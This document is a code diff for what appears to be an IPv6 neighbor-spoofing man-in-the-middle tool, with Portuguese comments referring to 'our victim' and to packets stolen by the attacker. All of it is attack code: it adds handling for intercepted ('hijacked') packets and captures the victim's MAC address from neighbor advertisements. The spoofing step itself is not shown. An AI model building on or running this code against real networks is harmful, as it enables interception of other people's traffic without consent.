@@ -5,7 +5,8 @@
 #include <netdb.h>
 #include <ifaddrs.h>
 #include <unistd.h>
-#include <packets.h>
+#include <pthread.h>
+#include <signal.h>
 
 #include <sys/socket.h>
 #include <sys/ioctl.h>
@@ -21,9 +22,8 @@
 #include <netinet/tcp.h>
 #include <netinet/ether.h>
 
-#include <pthread.h>
-#include <victims.h>
 #include <device.h>
+#include <packets.h>
 
 #define DEBUG 0
 
@@ -139,11 +139,20 @@ void packet_action(char *packet) {
 
 	/* Pacote para nossa vitima. */
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
-
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
-			/* TODO */
 			printf("Packet Hijacked? :-)\n");
+			/* TODO */
+			switch (ip6->ip6_nxt) {
+				case IPPROTO_ICMPV6:
+					icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+					break;
+				case IPPROTO_TCP:
+					tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+					break;
+				default:
+					break;
+			}
 		} else if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
 			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 
@@ -160,13 +169,15 @@ void packet_action(char *packet) {
 			}
 		}
 	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
-
 		/* Pacote enviado pela nossa vitima. */
 		switch (ip6->ip6_nxt) {
 			case IPPROTO_ICMPV6:
 				icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 				if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
-					printf("Se não tivermos pegado o MAC do server, esse é o momento.\n");
+					if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
+						memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
+						printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
+					}
 				}
 				break;
 			case IPPROTO_TCP:
@@ -197,7 +208,6 @@ int main(int argc, char **argv) {
 	int raw, len;
 	char packet_buffer[2048];
 	struct sockaddr_ll packet_info;
-	char server_victim[INET6_ADDRSTRLEN];
 	int packet_info_size = sizeof(packet_info);
 
 	struct sigaction saction;
